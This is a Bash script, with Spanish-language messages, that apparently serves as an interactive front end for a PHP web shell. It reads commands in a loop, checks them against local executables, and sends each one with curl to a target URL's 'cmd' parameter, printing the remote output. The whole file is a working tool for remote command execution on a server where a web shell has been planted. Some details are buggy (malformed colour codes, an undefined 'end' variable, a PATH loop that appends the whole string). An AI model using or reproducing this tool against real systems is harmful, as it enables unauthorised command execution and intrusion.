#!/bin/bash


#Colors
green="\e[0:32m\033[1m"
red="\e[0:31m\033[1m"
yellow="\e[0:33m\033[1m"
blue="\e[0;34m\033[1m"

#Variables globales
declare -a local_path
declare -r m_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games"


function crtl_c(){
    
	echo -e "${red}\n\n[!] Saliendo...${end}"
	tput cnorm && exit 1
}

trap crtl_c INT


function helpPanel(){
	echo -e "${green}\n\n[!] Uso de $0${end}"
	echo -e "${green}\n u) Dirección URL${end}"
	echo -e "${yellow}\n Ejemplo: ./shell.sh -u http://localhost:8080/shell.php${end}"
}

function makeRequest(){
	echo -ne "${green}"
	curl "$url?cmd=$1"
	echo -ne "${end}"
	
}

function getShell(){
	for path in $(echo $m_path | tr ':' ' '); do
		local_path+=($m_path)
	done

	while [ "$command" != "exit" ]; do
		counter=0; echo -ne "\n${green}$~${end}" && read -r command

		for element in ${local_path[@]}; do
			if [ -x $element/$(echo $command | awk '{print $1}') ]; then
				let counter+=1
				break
			elif [ "$(echo $command | awk '{print $1}')" == "cd" ]; then
				let counter+=1
				break	
			fi
		done

		if [ $counter -eq 1 ]; then
			command=$(echo $command | tr ' ' '+')
			makeRequest $command
		else
			echo -e "${red}Comando $(echo $command | awk '{print $1}') no encontrado${end}"
		fi
 	done
}

declare -i parameter_counter=0


while getopts "u:h" arg; do
	case $arg in
		u)url="$OPTARG"; let parameter_counter+=1;;
		h);;
	esac
done

if [ $parameter_counter -ne 1 ]; then
	helpPanel
else
	getShell	
fi	